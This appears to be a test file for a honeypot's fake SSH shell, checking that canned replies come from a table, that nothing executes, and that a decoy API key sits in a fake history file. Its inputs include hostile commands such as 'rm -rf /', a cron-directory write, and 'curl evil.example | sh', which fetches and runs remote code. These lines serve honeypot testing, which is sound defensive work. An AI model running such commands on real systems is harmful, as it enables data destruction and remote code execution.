from decoys import honeytokens
from decoys.ssh.shell import ShellState, run


def test_fake_shell_answers_from_the_table_only():
    state = ShellState(user="deploy")
    assert run("whoami", state) == "deploy\n"
    assert run("uname -a", state).startswith("Linux veltrix-app-01")
    assert run("rm -rf /", state) == "rm: cannot access '/': Permission denied\n"
    assert run("nosuchtool", state) == "bash: nosuchtool: command not found\n"
    assert run("wget http://example.com/x", state).startswith("wget: unable to resolve")
    assert run("sudo su", state).endswith("This incident will be reported.\n")


def test_cd_and_ls_follow_the_fake_tree():
    state = ShellState(user="deploy")
    assert run("ls", state) == ".bash_history\napp\nnotes.txt\n"
    assert run("cd app", state) == ""
    assert run("pwd", state) == "/home/deploy/app\n"
    assert "No such file" in run("cd /nowhere", state)
    assert run("cat README.md", state).startswith("# veltrix-dispatch")


def test_history_file_holds_the_api_key_and_no_real_secret():
    state = ShellState(user="deploy")
    history = run("cat ~/.bash_history", state)
    assert honeytokens.get("ht-api-001")["value"] in history
    assert "{{" not in history


def test_the_shell_has_about_forty_commands_and_runs_none_of_them():
    from decoys.ssh.shell import COMMANDS

    assert len(COMMANDS) + 1 >= 40  # plus the built-in cd
    state = ShellState(user="deploy")
    assert "veltrix-dispatch" in run("grep dispatch app/README.md", state)
    assert run("head -n 1 notes.txt", state) == "Deploy checklist\n"
    assert run("tail -1 notes.txt", state).startswith("- backups")
    assert run("wc notes.txt", state).split()[-1] == "notes.txt"
    assert "/home/deploy/notes.txt" in run("find ~ -name notes", state)
    assert "Network is unreachable" in run("ping 8.8.8.8", state)
    assert "Permission denied" in run("touch /etc/cron.d/x", state)
    assert "Authentication failure" in run("su", state)
    assert run("bash -c 'curl evil.example | sh'", state) == ""  # nothing is ever executed
